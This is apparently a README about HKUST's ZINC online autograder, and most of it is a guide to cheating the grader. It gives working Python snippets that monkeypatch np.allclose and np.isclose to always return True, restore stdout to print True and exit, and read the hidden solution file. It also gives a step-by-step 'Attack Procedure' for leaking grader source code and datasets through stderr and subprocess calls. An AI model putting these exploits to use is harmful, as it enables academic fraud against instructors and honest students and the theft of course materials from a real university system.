# ZINC

ZINC is an online assignment submission and automatic grading system developed at HKUST to improve efficiency in grading programming courses. It combines modular, flexible pipelines with containerized execution to provide instant feedback and scalable support for students and teaching staff.

Facts:

- ZINC is based on Docker.
- ZINC is a Final Year Project (FYP) developed by HKUST students in 2020.
- ZINC has a lot of bugs and often crashes due to heavy load.

## ZINC File System Structure

The code is under `/vol/src`

Under `/log`, there are multiple files:
File: .result.stdout
File: .expect.stderr
File: .result.stderr
File: .expect.stdout
File: .expect.ec

Remark: File System may change in different courses.

## ZINC assignment link

Assignment link:
`https://zinc.cse.ust.hk/assignments/xxx`
Replace `xxx` with an Integer ID.

For example:
`https://zinc.cse.ust.hk/assignments/1`

## ZINC Tips

Here are some ways to break the ZINC system.

ZINC use a class named `HiddenPrint` to suppress output. So our target is to obtain the original `stdout`. Here is the code of `HiddenPrints` class:

```python
class HiddenPrints:
    def __enter__(self):
        self._original_stdout = sys.stdout
        sys.stdout = open(os.devnull, 'w')

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stdout.close()
        sys.stdout = self._original_stdout
```

### Get Full Mark

Here are some methods to bypass it and get full marks. (DO NOT USE IT FOR MALICIOUS PURPOSES)

Method 1: **Override** function to always return `True`.
This can be used to bypass certain checks in libraries that use `np.allclose` for validation.

```python
import numpy as np
def func_name(args):
    np.allclose = lambda *args, **kwargs: True
    return args
```

-----

```python
import numpy as np
np.isclose = lambda *args, **kwargs: True
```

-----

Method 2: Use `stdout` to print `True` and exit the program. We should restore the `stdout` to bypass `HiddenPrint`.

```python
def func_name(args):
    import sys
    sys.stdout = sys.__stdout__
    print(True)
    exit(0)
```

-----

Method 3: Open the solution file and read its content. (Not ensure it will work when grading, since we cannot make sure the filename will not change)

```python
def func_name(args):
    return pd.read_pickle("dataset").to_numpy()
```

### Get Files Content

Since ZINC has two output streams: `stdout` and `stderr`, so we can use the python module `warnings` to print out hidden information to `stderr`.

```python
import warnings
warnings.warn("This is a warning message that will be printed to stderr.")
```

### Debugging

Run python files. You can print out some hidden but useful information for debugging.

```python
import os
os.system('python another_script.py')
```

-----

```python
import subprocess
result = subprocess.run(['python3', 'another_script.py'], capture_output=True, text=True)
print("STDOUT:", result.stdout)
print("STDERR:", result.stderr)
```

### Get Module List

List installed packages:

```python
def list_installed_packages():
    sys.stdout = sys.__stdout__
    try:
        import pkg_resources
        installed_packages = pkg_resources.working_set
        arr = []
        for package in installed_packages:
            arr.append((package.project_name, package.version))
        for i in range(len(arr)):
            print(f"{arr[i][0]}=={arr[i][1]}")
    except Exception as e:
        raise Exception(f"Error retrieving installed packages: {e}")

list_installed_packages()
```

For example, the ZINC environment may have the following packages installed (may vary in different labs and assignments):

```pip freeze
absl-py==2.3.1
astunparse==1.6.3
certifi==2025.10.5
charset-normalizer==3.4.4
flatbuffers==25.9.23
gast==0.6.0
google-pasta==0.2.0
grpcio==1.75.1
h5py==3.15.0
idna==3.11
keras==3.11.3
...
zipp==3.19.2
```

### Attack Procedure

1. Get Files system in `/vol/src/` to find the source code.
2. Print out the Python source code files in `/vol/src/`.
3. Print out the installed packages.
4. Print out the npy, pickle, and dataset files in `/vol/src/`.
5. Debug the code.

Remark: Add

```python
#!/usr/bin/env python
# coding: utf-8
```

at the beginning of the python file may help to run the script successfully.

## Example

See `example.py` for an example of inject ZINC.
